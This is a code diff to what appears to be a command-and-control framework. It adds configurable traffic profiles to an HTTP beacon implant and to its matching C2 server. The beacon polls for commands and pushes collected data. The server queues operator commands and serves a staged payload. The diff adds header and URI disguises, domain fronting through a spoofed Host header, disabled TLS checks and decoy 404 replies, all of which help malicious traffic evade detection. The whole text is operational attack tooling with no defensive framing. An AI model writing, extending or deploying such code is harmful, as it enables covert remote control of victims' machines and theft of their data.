@@ -12,12 +12,15 @@ class HttpBeaconProtocol:
 
     def __init__(self, server_url: str, front_host: Optional[str] = None,
                  user_agent: str = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-                 sleep_time: float = 5.0, jitter: float = 0.3):
+                 sleep_time: float = 5.0, jitter: float = 0.3,
+                 profile_name: str = 'default'):
         self._url = server_url.rstrip('/')
         self._front_host = front_host
         self._user_agent = user_agent
         self._sleep_time = sleep_time
         self._jitter = jitter
+        from common.http_profile import get_profile
+        self._profile = get_profile(profile_name)
         self._session = self._build_session()
         self._pending_commands: deque = deque()
         self._recv_lock = threading.Lock()
@@ -27,9 +30,11 @@ class HttpBeaconProtocol:
             import requests
             session = requests.Session()
             session.verify = False
-            session.headers.update({'User-Agent': self._user_agent})
+            session.headers.update({'User-Agent': self._profile.user_agent or self._user_agent})
             if self._front_host:
                 session.headers.update({'Host': self._front_host})
+            for key, val in self._profile.headers.items():
+                session.headers.update({key: val})
             return session
         except ImportError:
             return None
@@ -41,7 +46,7 @@ class HttpBeaconProtocol:
         try:
             payload = data if isinstance(data, str) else json.dumps(data)
             self._session.post(
-                f'{self._url}/push',
+                f'{self._url}{self._profile.push_uri}',
                 data=payload,
                 headers={'Content-Type': 'application/json'},
                 timeout=30,
@@ -63,7 +68,7 @@ class HttpBeaconProtocol:
 
             try:
                 resp = self._session.get(
-                    f'{self._url}/poll',
+                    f'{self._url}{self._profile.poll_uri}',
                     timeout=30,
                 )
                 if resp.status_code == 200 and resp.text.strip():
@@ -107,11 +112,13 @@ class HttpC2Server:
 
     def start(self):
         from http.server import HTTPServer, BaseHTTPRequestHandler
+        from common.http_profile import get_profile
 
         outgoing = self._outgoing
         incoming = self._incoming
         lock = self._lock
         stage_payload = self._stage_payload
+        profile = get_profile('default')
 
         class Handler(BaseHTTPRequestHandler):
             def log_message(self, format, *args):
@@ -121,27 +128,31 @@ class HttpC2Server:
                 if self.path == '/stage' and stage_payload:
                     self.send_response(200)
                     self.send_header('Content-Type', 'application/octet-stream')
-                    self.send_header('Content-Length', str(len(stage_payload)))
+                    self.send_header('Content-Length', len(stage_payload))
                     self.send_header('Access-Control-Allow-Origin', '*')
                     self.end_headers()
                     self.wfile.write(stage_payload)
                     return
-                if self.path == '/poll':
+                if self.path in ('/poll', profile.poll_uri):
                     with lock:
                         if outgoing:
                             cmd = outgoing.popleft()
                             self._respond(200, cmd)
                             return
                     self._respond(204, '')
+                    return
+                self._respond(404, {'error': 'not found'})
 
             def do_POST(self):
-                if self.path == '/push':
+                if self.path in ('/push', profile.push_uri):
                     length = int(self.headers.get('Content-Length', 0))
                     if length > 0:
                         data = self.rfile.read(length).decode()
                         with lock:
                             incoming.append(data)
                     self._respond(200, 'ok')
+                    return
+                self._respond(404, {'error': 'not found'})
 
             def _respond(self, code, body):
                 self.send_response(code)
